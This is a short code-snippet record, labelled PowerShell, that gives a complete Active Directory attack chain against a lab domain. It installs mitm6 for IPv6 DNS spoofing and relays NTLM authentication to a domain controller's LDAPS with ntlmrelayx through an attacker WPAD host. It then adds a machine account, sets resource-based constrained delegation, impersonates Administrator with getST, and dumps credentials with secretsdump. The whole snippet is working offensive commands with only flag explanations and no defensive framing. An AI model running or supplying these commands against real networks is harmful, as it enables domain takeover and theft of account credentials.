---
id: 1a4bd987-1725-4085-9dff-0d49978d97e2
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:05.647219+00:00'
updated_at: '2023-04-10T20:25:58.627311+00:00'
---

# Code Snippet 1a4bd987

**Language**: Powershell

```powershell
git clone https://github.com/fox-it/mitm6.git 
cd /opt/tools/mitm6
pip install .

mitm6 -hw ws02 -d lab.local --ignore-nofqnd
# -d: the domain name that we filter our request on (the attacked domain)
# -i: the interface we have mitm6 listen on for events
# -hw: host whitelist

ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad
ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer
# -ip: the interface you want the relay to run on
# -wh: WPAD host, specifying your wpad file to serve
# -t: the target where you want to relay to

# now granting delegation rights and then do a RBCD
ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
export KRB5CCNAME=administrator.ccache  
secretsdump.py -k -no-pass target.lab.local  
```


